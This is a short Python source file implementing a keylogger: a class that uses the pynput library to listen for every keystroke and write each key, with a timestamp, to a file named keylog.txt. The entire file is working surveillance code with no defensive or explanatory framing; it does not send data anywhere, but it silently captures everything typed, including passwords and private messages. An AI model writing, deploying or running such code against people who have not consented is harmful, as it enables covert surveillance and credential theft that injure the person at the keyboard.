import os
import logging
from pynput import keyboard

class KeyLoggerFunction:
    def __init__(self):
        self.log_file = "keylog.txt"

    def run(self):
        logging.basicConfig(filename=self.log_file, level=logging.DEBUG, format="%(asctime)s [%(levelname)s]: %(message)s")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        try:
            key_text = self.get_key_text(key)
            logging.info(key_text)
        except AttributeError:
            pass

    def get_key_text(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char
        else:
            return str(key)

if __name__ == "__main__":
    key_logger = KeyLoggerFunction()
    key_logger.run()
